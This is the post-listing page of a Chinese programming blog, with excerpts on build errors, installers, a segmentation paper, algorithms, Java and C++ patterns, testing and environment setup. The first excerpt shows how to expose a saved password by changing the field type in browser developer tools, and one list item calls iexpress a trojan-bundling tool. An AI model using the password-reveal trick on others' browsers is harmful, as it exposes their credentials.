<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcc3e13820034b8390decaabc0bf5580/" rel="bookmark">
			火狐浏览器如何查看网页记住保存的密码？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境： Windows 10企业版G
火狐浏览器98.0
问题描述： 我们在网页上保存了密码后使我们方便很多，就是时间长久容易忘记，今天来和大家分享一下如何查看网页保存的密码，网页忘记密码，●●●●●● 如何查看保存的密码？
解决方案： 1.按F12或者鼠标右键选择“检查”按钮，打开浏览器调试功能
2.选中密码处，找到下面修改“type=password”
3.把password直接修为“text”回车即可出现密码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0afa1f01473222123d6aab131671cdbd/" rel="bookmark">
			在resin4.0部署项目，出现server ‘default’ is an unknown server in the configuration file 错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在配置resin4.0部署项目时出现以下报错：
com.caucho.config.ConfigException: -server 'default' is an unknown server in the configuration file. at com.caucho.server.resin.Resin.initTopology(Resin.java:1101) at com.caucho.server.resin.Resin.initServletSystem(Resin.java:1307) at com.caucho.server.resin.Resin.configure(Resin.java:1026) at com.caucho.server.resin.Resin.initMain(Resin.java:1008) at com.caucho.server.resin.Resin.main(Resin.java:1469) -server 'default' is an unknown server in the configuration file. 解决：在resin启动参数里加上-server app-0，启动前缀名为app的服务。
如图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76af17caa31d545869b33eb12634c5d7/" rel="bookmark">
			ValidationError: Progress Plugin Invalid Options
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在运行vue run serve 的时候遇到了下面问题
ValidationError: Progress Plugin Invalid Options options should NOT have additional properties options should NOT have additional properties options should NOT have additional properties options should pass "instanceof" keyword validation options should match exactly one schema in oneOf 于是我就想昨天还好好的今天怎么就不行了，应该是我今天的操作有问题
我在运行项目之前安装了一个loader，于是我就新创建了一个vue2.x的项目对比里面的包有什么不同
原来是vue-cli升级到了5.0版本，原来是我运行了npm audit fix这个命令它会更新loader,但更新了之后会出现很多不兼容问题
2 packages are looking for funding run `npm fund` for details 34 vulnerabilities (22 moderate, 11 high, 1 critical) To address issues that do not require attention, run: npm audit fix To address all issues (including breaking changes), run: npm audit fix --force Run `npm audit` for details.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76af17caa31d545869b33eb12634c5d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/337207ed5dcb1f3a32f8e93bff113a51/" rel="bookmark">
			VS2019 打包WPF安装程序最新教程(图文详解)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用VS2019打包WPF安装程序有很多种方法，本篇教程基于VS扩展插件Microsoft Visual Studio Installer Projects工具来打包，实际上此工具，在VS2010时自带有，只是后面版本的Visual Studio取消了此插件，现在需要单独安装。
安装打包Installer插件
安装Microsoft Visual Studio Installer Projects插件有两种方式。一是下载插件单独安装，二是在VS里面在线安装。
Microsoft Visual Studio Installer Projects下载地址：
官方下载地址：点击下载
下载下来后，你会在你的保存目录看到此文件的图标是这样的，直接双击安装就可以了，如果打开了Visual Studio，先将VS关闭后再安装即可。
安装插件
如果你不能从官网下载到，可以从本站直接下载即可。离线下载安装的方式适用于断网环境开发。
VS在线安装Microsoft Visual Studio Installer Projects
Microsoft Visual Studio Installer Projects插件也可以在线直接安装，步骤为：点击菜单栏【扩展（X）】，然后在弹出来的一个窗体里面，在右侧搜索框里面搜索“Microsoft Visual Studio Installer Projects”，一般第1个就是它了，然后点击Download（下载），然后安装就可以了。
VS
在线安装Microsoft Visual Studio Installer Projects
点击Download后如下：
下载插件
下载完毕后，你需要把VS关闭掉，它会自动的安装。
自动安装插件
安装好了后，启动VS即可。
创建安装项目
重新打开Visual Studio，打开一个你现有的包含WPF项目的解决方案即可，然后创建安装项目。在解决方案上右键 –&gt; 【新建项目】–&gt; 【Setup Project】，添加Setup Project项目时，VS2019可以搜索项目模板，如下图所示。
创建安装项目
创建好了后，主界面变成如下图所示：
安装项目主界面
左边窗口三个文件夹图片说明如下：
Application Folder：应用程序包含的文件设置，指最终在客户电脑上的安装根目录。如下图所示：
应用程序目录子目录
User's Desktop：用户桌面快捷方式设置，用户桌面，一般放个快捷图标。
User's Programs Menu：用户启动菜单的快捷方式设置，一般也是放快捷图标。
Application Folder是安装程序的根目录，你编写的程序生成的dll，安装后就存放在这个目录。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/337207ed5dcb1f3a32f8e93bff113a51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdd0a7d673034a26c2696492e4bb8e04/" rel="bookmark">
			Fully Convolutional Networks for Semantic Segmentation ————全卷积网络 FCN论文解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Fully Convolutional Networks for Semantic Segmentation 作者： Jonathan Long, Evan Shelhamer, Trevor Darrell;
出处： Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR), 2015, pp. 3431-3440
Abstract 卷积网络是强大的视觉模型，能产生层次分明的特征。我们证明，卷积网络本身通过端到端、像素到像素的训练，在语义分割方面超过了最先进的水平。关键是建立 "完全卷积 "网络，该网络接受任意大小的输入，并产生相应大小的输出，同时具有高效的推理和学习能力。本文定义并详细说明了全卷积网络的空间构造，解释了它们在空间密集型预测任务中的应用，并得出与先前模型的联系。本文将当代分类网络（AlexNet、VGG 和GoogLeNet）改编为全卷积网络，并通过精调将它们学到的表征转移到分割任务上。然后，设计了一个skip跳跃结构，将深层次、粗略的语义信息与来自浅层、细致的局部信息结合起来，以产生准确而详细的分割。本文的全卷积网络实现了对PASCAL VOC（相对于2012年62.2%的平均IU提高了20%）、NYUDv2和SIFT Flow的最先进的分割，而对于一个典型的图像，推理时间不到五分之一秒。
一、Introduction 全卷积网络FCN
特点：1、FCN是将卷积网络的全连接层变为1*1卷积层，实现端到端
2、利用迁移学习进行微调，将成功的分类网络转移到密集预测
3、FCN使用跳跃连接，将全局和局部信息结合起来，提高分割精度
二、Related work 根据现有方法的不同，本文调整和扩展了深度分类架构，将图像分类作为有监督的预训练，并对全卷积进行微调，将各层的特征融合起来，形成一个非线性的从局部到整体的表征，进行端到端的调整，以简单而有效地方式从整个图像输入和整个图像基础上学习。
三、Fully convolutional networks 1、感受域：高层次的一个位置与输入图像的位置相对应，这个对应的区域称为感受域
2、平移不变性：卷积网络是建立在平移不变性的基础上，卷积、池化和激活函数在局部输入区域上运行，并且依赖于相对空间坐标。（二次采样会影响卷积神经网络）
3、FCN可以对任何大小的输入进行操作，并产生相应（可能重新采样）空间维度的输出。
4、FCN将所有末级感受野作为一个小批量，当这些感受野明显重叠时，在整个图像上逐层计算时，前馈计算和反向传播都要比逐块单独计算时效率更高。
方法：
（一）adapting classifiers for dense prediction 调整分类器用于密集预测
全连接层被视为卷积核覆盖整个输入区域的卷积。将它们投射到完全卷积的网络中，这些网络接受任何大小的输入，最后添加层和空间损失，输出分类图。
（二）shift-and-stitch is filter rarefaction 移位和拼接是过滤器稀疏
（本文未使用）
（三）upsampling is backwards strided convolution 上采样是转置卷积（反卷积）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bdd0a7d673034a26c2696492e4bb8e04/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e3e6bfbce469a4197a4856e9bda15a5/" rel="bookmark">
			LeetCode300. 最长递增子序列（动态规划 / 贪心）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		力扣
解题思路： 1.动态规划 状态定义：dp[i] 的值代表 nums 以 nums[i] 结尾的最长子序列长度。转移方程： 设 j∈[0,i)j∈[0,i)，考虑每轮计算新 dp[i] 时，遍历[0,i) 列表区间，做以下判断： 当 nums[i]&gt;nums[j] 时： nums[i] 可以接在 nums[j] 之后（此题要求严格递增），此情况下最长上升子序列长度为 dp[j]+1 ；当 nums[i]&lt;=nums[j] 时：nums[i] 无法接在nums[j] 之后，此情况上升子序列不成立，跳过。上述所有 1. 情况 下计算出的 dp[j]+1 的最大值，为直到 i 的最长上升子序列长度（即 dp[i] ）。实现方式为遍历 j 时，每轮执行 dp[i]=max(dp[i],dp[j]+1)。 转移方程： dp[i] = max(dp[i], dp[j] + 1) for j in [0, i)。初始状态：dp[i] 所有元素置 1，含义是每个元素都至少可以单独成为子序列，此时长度都为 1。返回值：返回dp 列表最大值，即可得到全局最长上升子序列长度。 class Solution { public: int lengthOfLIS(vector&lt;int&gt;&amp; nums) { int size = nums.size(); if (size == 1) return 1; vector&lt;int&gt; dp(size, 1); //初始化 int ret = 0; for (int i = 1; i &lt; size; ++i) { for (int j = 0; j &lt; i; ++j) //状态转义方程 { if (nums[j] &lt; nums[i]) { dp[i] = max(dp[i], dp[j] + 1); } } } for (auto&amp; e : dp) { if (ret &lt; e) { ret = e; } } return ret; } }; 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e3e6bfbce469a4197a4856e9bda15a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78ea390e05a2cf1ce572212106d76238/" rel="bookmark">
			Win&#43;R命令，你了解多少？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在windows系统中经常经常需要使用一些快捷键快速打开某些设置，在windows系统中由于开始运行命令很难找到，通过Win+R组合快捷键即可快速打开运行命令框。
1、启动计算器 calc 2、启动字符映射表 charmap 3、Chkdsk磁盘检查 chkdsk 4、磁盘清理 cleanmgr 5、剪贴板查看器 clipbrd 6、CMD命令提示符 cmd.exe 7、DVD播放器 dvdplay 8、DirectX诊断工具 dxdiag 9、造字程序（专用字符编辑程序） eudcedit 10、资源管理器 explorer 11、木马捆绑工具，系统自带 iexpress 12、放大镜 magnify 13、简易widnows media mplayer2 14、系统配置 player msconfig 15、画图板 mspaint 16、远程桌面连接 mstsc 17、屏幕“讲述人” narrator 18、打开记事本 notepad 19、IP地址侦测器 nslookup 20、打开屏幕键盘 osk 21、注册表编辑器 regedit 22、注册表编辑器 regedt32 23、录音机 sndrec32 24、音量控制程序 sndvol 25、任务管理器 taskmgr 26、写字板 write 27、系统组件服务 dcomcnfg 28、DDE共享设置 ddeshare 29、网络管理的工具向导 nslookup 30、系统备份和还原 ntbackup 31、同步中心 mobsync 32、系统信息 winmsd 33、检查Windows版本 winver 34、扫描仪和照相机向导 wiaacmgr 35、windows脚本宿主设置 wscript 36、windows更新程序 wupdmgr 37、管理控制台 mmc 38、证书管理 certmgr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78ea390e05a2cf1ce572212106d76238/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10f4cc49512b1412da1b4247c9beb361/" rel="bookmark">
			Flv 格式分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1 定义&amp;作用
2 整体介绍
2.1 FLV Header
2.2 FLV Body
2.2.1 Tag header:
2.2.2 每种类型的Tag Data详解
1) Audio Tag Data
2) Video Tag Data
3) Script Tag Data 正文 系列文章：
rtmp 分析参见：rtmp 看一篇就够了草稿_fdsafwagdagadg6576的专栏-CSDN博客.
H264解析:https://blog.csdn.net/fdsafwagdagadg6576/article/details/108561061
一个FLV文件由一个头部信息，一个script Tag，以及若干个video Tag和audio Tag组成.
(上图的scrtip data应该移到Previous tagsize(N)之上)
本文主要内容来自：FLV格式详解 https://blog.csdn.net/weixin_42462202/article/details/88661883上文一层一层介绍了FLV格式. 本文对其内容增加了思维导图，增加了comments并补充了实例.
1 定义: FLV是一种文件格式.类似的还有Mp4.
作用: 将H264,Aac裸流封装成文件格式.
为什么要对裸流做文件格式封装？即FLV文件和原始文件区别？
1 文件播放. 原始文件播放读一帧解析一帧. 没有整体时长,不能拖拽，倍速播放等音视频控制了.
FLV文件因为有FLV tag保存音视频信息。所以可以显示视频时长，播放进度，拖拽，倍速播放等.
2 是协议支持，rtmp协议要求，数据必须Flv格式. rtc协议数据才是裸流。
关键字：tag 2 整体介绍： Flv由 “Flv header” 和 “Flv Body”组成。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10f4cc49512b1412da1b4247c9beb361/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb4fbbdec74d5efa1ca3c40cf22c2731/" rel="bookmark">
			java单例模式常见的几种写法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单例模式有多种写法，都有各自的优缺点，最常见的优缺点就是【懒汉和饿汉】的比较，以及是否线程安全
懒汉模式，节约内存，只有使用到时才创建单例对象，可能会有线程安全问题饿汉模式，浪费内存，但可以由JVM类加载器去保证线程安全 一、饿汉模式 public class Singleton1 { /** * 饿汉式提前创建好单例对象(在类被主动使用时便会触发静态变量的初始化) */ private final static Singleton1 INSTANCE = new Singleton1(); /** * 禁止外部实例化 */ private Singleton1() { } public static Singleton1 getInstance() { return INSTANCE; } } 二、懒汉模式(线程不安全) public class Singleton2 { /** * 即使是类被主动使用，也不会触发INSTANCE的创建 */ private static volatile Singleton2 INSTANCE = null; /** * 禁止外部实例化 */ private Singleton2() { } /** * 当调用getInstance方法获取单例对象时再创建单例对象，当INSTANCE为空时才创建 * 这种是线程不安全的 */ public static Singleton2 getInstance() { if (INSTANCE == null) { INSTANCE = new Singleton2(); } return INSTANCE; } } 三、懒汉模式(线程安全) public class Singleton6 { private static volatile Singleton6 INSTANCE = null; /** * 禁止外部实例化 */ private Singleton6() { } public static Singleton6 getInstance() { // 通过加锁保证线程安全，但是性能会相应的降低 synchronized (Singleton6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb4fbbdec74d5efa1ca3c40cf22c2731/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5680e439366e83a14b057cf7ea1d1c21/" rel="bookmark">
			汇编语言下载安装及使用（hello world，仅供学习参考）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初次汇编语言编写程序输出HELLO,WORLD!
初次编写汇编语言，其中遇到了很多困难和问题，下载了很多东西，也查阅了很多关于汇编的资料内容，最后为方便大家直接可以使用快速上手，我把自己花费大量时间和精力整理的配置的资源，免费分享给有需要的朋友，以及本篇文章也会提供基本操作过程，希望能够帮助到各位。
温馨提示：因为博主已经下载好的MASM编译汇编代码在64位windows中不兼容无法操作运行，所以会通过使用DOSBox0.74软件挂载MASM到其他盘，在其他盘中进行编译操作完成实验。
一、点击下载博主关于MASM配置好的资源
配置资源：
下载masm配置好的文件，提取码为ntaa
二、下载之后，对压缩包进行解压（博主是解压到D盘的新键的masm文件夹）。
三、找到自己解压的文件路径，点击红色箭头指向的红色框中的内容（DOSBox-0.74文件夹）。
四、进入之后，双击红色箭头指向的红色框中的内容（DOSBox.exe）。
五、操作完成后，会出现下面的页面。
六、在新页面中首先输入“mount d d:\masm”,然后转盘到D盘（红色箭头指向的红色框中的内容）
七、然后准备开始编译你所需要编写的汇编语言文件（博主以HELLO.ASM为例）。温馨提示：ASM源程序文件 -&gt; OBJ二进制目标文件 -&gt; EXE可执行文件。（注意：博主因为之前自行先编译过一次，所以HELLO.ASM、HELLO.OBJ、HELLO.EXE在文件夹中已经同时存在了，但建议大家可以把其删掉自己再重新编译）
八、然后在原页面中继续输入“MASM HELLO.ASM”,然后不断按enter键，完成ASM源程序文件 -&gt; OBJ二进制目标文件的转换。（红色箭头指向的红色框中的内容）
九、然后在原页面中继续输入“LINK HELLO.OBJ”,然后不断按enter键，完成OBJ二进制目标文件 -&gt; EXE可执行文件的转换。（红色箭头指向的红色框中的内容）
十、最后在原页面中继续输入“HELLO.EXE”，完成汇编语言编写程序输出HELLO,WORLD!
十一、附录1：HELLO.ASM文件的汇编语言代码
DATA SEGMENT STRING DB 'HELLO,WORLD!$' DATA ENDS CODE SEGMENT MAIN PROC FAR ASSUME CS:CODE,DS:DATA START: MOV AX,DATA MOV DS,AX MOV DX,OFFSET STRING MOV AH,9 INT 21H MOV AH,4CH INT 21H MAIN ENDP CODE ENDS END START 十二、附录二：编写ASM后缀文件
博主这边是用txt文本文件重命名改写的,改写成功后再用文本方式打开进行汇编语言编写。
1、第一步新键文本文档，然后右击点击文件重命名
2、点击确认然后修改成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a201127ff84ea89af68746e4aa9fd523/" rel="bookmark">
			自增，自减运算符的重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：前置运算符作为一元运算符重载：
1.重载为成员函数：
T &amp; operator++();
T &amp; operator--();
2.重载为全局函数：
T1 &amp; operator++(T2);
T1 &amp; operator--(T2);
二：后置运算符作为二元运算符重载，多写一个没用的参数：
1.重载为成员函数：
T &amp; operator++(int);
T &amp; operator--(int);
2.重载为全局函数：
T1 &amp; operator++(T2,int);
T1 &amp; operator--(T2,int);
#include&lt;iostream&gt; using namespace std; class Complex { private: int n; public: Complex(int a=0):n(a){} operator int(){return n;} Complex&amp; operator++(); Complex operator++(int ); friend Complex&amp; operator--(Complex&amp; ); friend Complex operator--(Complex&amp; ,int ); }; Complex&amp; Complex::operator++() { n++; return *this; } Complex Complex::operator++(int a) { Complex temp=(*this); n++; return temp; } Complex&amp; operator--(Complex&amp; a) { a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a201127ff84ea89af68746e4aa9fd523/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbb81fddb9098fcb05ca7ed2b3c564a0/" rel="bookmark">
			Pytest框架读取yaml文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		yaml.util.py
import yaml
“”"
问题1：解析的yaml文件必须是utf-8的格式，可以用notepad++来查看格式
“”"
def read_yaml():
“”"
读取yaml文件
:return:
“”"
with open(‘get_new.yaml’, encoding=‘UTF-8’) as f:
data = yaml.load(f, Loader=yaml.FullLoader)
return data
if name == ‘main’:
print(read_yaml())
get_new.yaml
api_name: 获取网易新闻
api_request:
url: https://api.apiopen.top/getWangYiNews
method: post
headers:
Content-Type: application/json
params:
page: 1
count: 5
api_validate: eq: {code: 200} test_api.py
import pytest
from yaml_util import read_yaml
import requests
class TestApi:
# 最基本的用法 # @pytest.mark.parametrize("args", ['百里', '星瑶', '依然', '修习人生']) # def test_01_api(self, args): # "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbb81fddb9098fcb05ca7ed2b3c564a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8fe989ed4f509c9a541745df751c608/" rel="bookmark">
			Unity之UnityWebRequest和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 1. UnityWebRequest
官方描述：
UnityWebRequest 提供了一个模块化系统，用于构成 HTTP 请求和处理 HTTP 响应。UnityWebRequest 系统的主要目标是让 Unity 游戏与 Web 浏览器后端进行交互。该系统还支持高需求功能，例如分块 HTTP 请求、流式 POST/PUT 操作以及对 HTTP 标头和动词的完全控制。
从官方描述来看，对于UnityWebRequest类的升级更大程度代表了Unity对于Webgl网页浏览器支持的优化。
2.WWW类
其实5.4版本的时候就出了新的API UnityWebRequest用于替代WWW，有些较大的文件下载需要断点续传的功能（即下载了一部分突然中断下载后，再次下载直接从上次下载的地方继续下载，而不是重新下载）就需要使用HttpWebRequest或UnityWebRequest，在2017版本中WWW是还没有被弃用的，2018版本我没有试过，2019是已经被弃用的，使用的时候可以看到这个类被画上了绿色波浪。
这里大体的描述一下，后面还可能会持续深入解剖。下面讲述一下这个类的一些常用接口和使用
二、常用方法Get、Post、Put和Head UnityWebRequest
架构：
UnityWebRequest 生态系统将 HTTP 事务分解为三个不同的操作：
向服务器提供数据从服务器接收数据HTTP 流量控制（例如，重定向和错误处理） UnityWebRequest由三个元素组成：
1 UpLoadHandler处理数据将数据上传到服务器的对象；
2 DownLoadHandler从服务器下载数据的对象；
3 UnityWebRequest负责与HTTP通信并管理上面两个对象。还处理 HTTP 流量控制。此对象是定义自定义标头和 URL 的位置，也是存储错误和重定向信息的位置。
更多描述请看官网手册：https://docs.unity.cn/cn/2019.4/Manual/UnityWebRequest.html （1）常用方法：
方法作用SendWebRequest()开始与远程服务器通信。在调用此方法之后，有必要的话UnityWebRequest将执行DNS解析，将HTTP请求发送到目标URL的远程服务器并处理服务器的响应。Get(url)创建一个HTTP为传入URL的UnityWebRequest对象Post（url)向Web服务器发送表单信息Put(url)将数据上传到Web服务器Abort()直接结束联网Head()创建一个为传输HTTP头请求的UnityWebRequest对象GetResponseHeader()返回一个字典，内容为在最新的HTTP响应中收到的所有响应头 （2）构造函数
public UnityWebRequest（）; public UnityWebRequest（Uri uri）; public UnityWebRequest（Uri uri，string method）; public UnityWebRequest（Uri uri，string method,Networking.DownloadHandler downloadHandler， Networking.UploadHandler uploadHandler）; 参数含义URLurl网址信息或本地文件路径信息method相当于方法名，只有GET, POST, PUT, HEAD四种，默认为GET，一旦调用SendWebRequest()，就无法更改downloadHandler下载数据的委托方法uploadHandler上传数据的委托方法 下面介绍一下一些经常用的接口。介绍之前先简单聊聊GET、POST和PUT这三种方式的区别
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8fe989ed4f509c9a541745df751c608/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/580955c997fc47d2c71fdad67cc4df0f/" rel="bookmark">
			python pyqt5&#43;vtk安装以及配置采坑记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pyqt5+vtk安装以及配置记录 一、pyqt5安装1.1 环境配置1.2 ImportError: unable to find Qt5Core.dll on PATH1.3 警告 Please remove this file manually (you may need to reboot to free file handles)1.4 this application failed to start because no qt platform plugin .... 二、vtk安装2.1 无法卸载2.2 代码无提示问题 一、pyqt5安装 建议先使用conda创建虚拟环境
conda install pyqt (推荐) 或者 pip install PyQt5 -i https://pypi.douban.com/simple
pip install PyQt5-tools -i https://pypi.douban.com/simple
1.1 环境配置 https://www.jb51.net/article/156026.htm (pycharm配置pyqt5-tools开发环境的方法步骤) 从c++转python， 推荐阅读以下文章：
https://zhuanlan.zhihu.com/p/95082345 PyQt5实现多文件调用以及UI和逻辑分离 1.2 ImportError: unable to find Qt5Core.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/580955c997fc47d2c71fdad67cc4df0f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d9fe95544daa54e82649f026fe95e41/" rel="bookmark">
			Latex、XeLatex无法加粗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		XeLaTeX是新的Unicode版本，内建支持Unicode(UTF-8)，可以调用操作系统的字体。但是在使用的时候也可能会出现许多问题，例如我最近使用的时候字体就一直无法显示粗体，但是运行的时候不报错。
原因有可能是你的系统里面缺少模板指定的加粗字体。
解决办法如下：
1.在文章的开头部分找到定义文章样式的类文件。
2.找到对应的类文件并打开。
3.找到 \setmainfont{} 如图， 这里定义的文章的主要使用字体类型。图中表示的是文章默认的文本、加粗、斜体字体都默认为Minion Pro。
也有可能是下面一种情况：
\setmainfont[BoldFont=Times New Roman, ItalicFont={Nimbus Roman No9 L}]{Minion Pro}
这表示文章的默认字体是Minion Pro，加粗显示为Times New Roman字体，斜体显示为Nimbus Roman No9 L字体。
4.弄明白自己文章中使用的是哪种字体之后，就可以去操作系统的字体库里面去查看是不是缺少这种字体，我们还以Minion Pro字体为例。
C盘-&gt;Windows-&gt;Fonts 这里面存放的就是我们的系统字体，我们可以在右上角的搜索框搜索，也可以直接在文件夹中找
5.经搜索我们发现确实缺少了我们所使用字体，至此，我们就找到了字体不能加粗的原因。此时我们需要去下载我们需要的字体。 我们需要的是Minion Pro的粗体，那么可以直接安装粗体。
6.下载解压后得到类似下面的文件，我们需要的是MinionPro-Bold.otf文件，双击打开它。
7.点击左上角的安装，即可安装字体。
8.我们此时再在C盘-&gt;Windows-&gt;Fonts 里搜索就能发现我们已经安装成功。
9.此时，我们再去运行.tex文件，若是粗体还不显示，就是因为存在之前的缓存，我们删掉如图红框内的缓存文件，再去运行.tex文件就能发现粗体已经可以正常显示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e2c6d516de559e8155beb3a43b9e75f/" rel="bookmark">
			tensorflow基础学习-anaconda方式安装tensorflow（gpu-1.15.0版本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 关于anaconda方式安装tensorflow(cpu版本)之前已经有博客写过了。这一次更新一下anaconda方式安装tensorflow（gpu版本），他们的区别在于TensorFlow-gpu版对安装的要求要高些，需要NVIDIA的驱动及CUDA工具支持。
1、关于CPU、GPU、CUDA、cuDNN的理解 关于这一块，我刚刚入门，就直接引入了别人写好的理解关于CPU、GPU、CUDA、cuDNN的理解
gpu与cpu
GPU（图像处理器，Graphics Processing Unit）和CPU（中央处理器，Central Processing Unit）在设计上的主要差异在于GPU有更多的运算单元（如图中绿色的ALU），而Control和Cache单元不如CPU多，这是因为GPU在进行并行计算的时候每个运算单元都是执行相同的程序，而不需要太多的控制。Cache单元是用来做数据缓存的，CPU可以通过Cache来减少存取主内存的次数，也就是减少内存延迟（memory latency）。GPU中Cache很小或者没有，因为GPU可以通过并行计算的方式来减少内存延迟。因此CPU的Cahce设计主要是实现低延迟，Control主要是通用性，复杂的逻辑控制单元可以保证CPU高效分发任务和指令。所以CPU擅长逻辑控制，是串行计算，而GPU擅长高强度计算，是并行计算。
GPU加速是通过大量线程并行实现的，因此对于不能高度并行化的工作而言，GPU就没什么效果了。而CPU则是串行操作，需要很强的通用性，主要起到统管和分配任务的作用。
CUDA
CUDA是NVIDIA推出的用于自家GPU的并行计算框架，也就是说CUDA只能在NVIDIA的GPU上运行，而且只有当要解决的计算问题是可以大量并行计算的时候才能发挥CUDA的作用。
cuDNN
cuDNN（CUDA Deep Neural Network library）：是NVIDIA打造的针对深度神经网络的加速库，是一个用于深层神经网络的GPU加速库。如果你要用GPU训练模型，cuDNN不是必须的，但是一般会采用这个加速库。
2、检查硬件环境配置 （1）检查显卡驱动信息
先找到NVIDIA Control Panel，检查驱动版本是否支持CUNA10.0
我的驱动是457.52，所以可以进行接下来的安装，如果发现电脑驱动过低，我看到有些博客有谈到可以在NVIDIA官网更新驱动
（2）安装前确定版本信息
我这里打算安装
tensorflow1.0+的版本可能更适用于初学者学习网上的代码
3、创建虚拟环境 打开Anaconda中的 Anaconda Prompt
输入命令创建新的虚拟环境
conda create -n TF115GPU python=3.7.0 注意安装的版本，这里的版本和上面的表格是对应的
4、激活虚拟环境 输入命令
activate TF115GPU 或者
conda activate TF115GPU 这种在服务器上输入必须加入conda
进入虚拟环境
5、安装CUDA 查看可供安装的版本
conda search cudatoolkit 查看之前我要安装的tensorflow_gpu-1.15.0，我需要安装cuda版本是10.0的
安装cuda命令
conda install cudatoolkit=10.0.130 我这里第一次安装的时候出现了错误
猜测可能访问速度过慢导致的报错，于是简单直接重新安装了一次就好了，后来查了一下关于这个错误的解决方法解决方法
5、安装cudnn 同样，先查找可安装的版本
conda search cudnn 我安装cudnn版本是7.6.0的，这里很多地方都说装的版本是7.4.1，但是会报错，按照自己系统的来，按照7.6.0就不会报错了
进行安装
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e2c6d516de559e8155beb3a43b9e75f/">Read more…</a>
	</div>
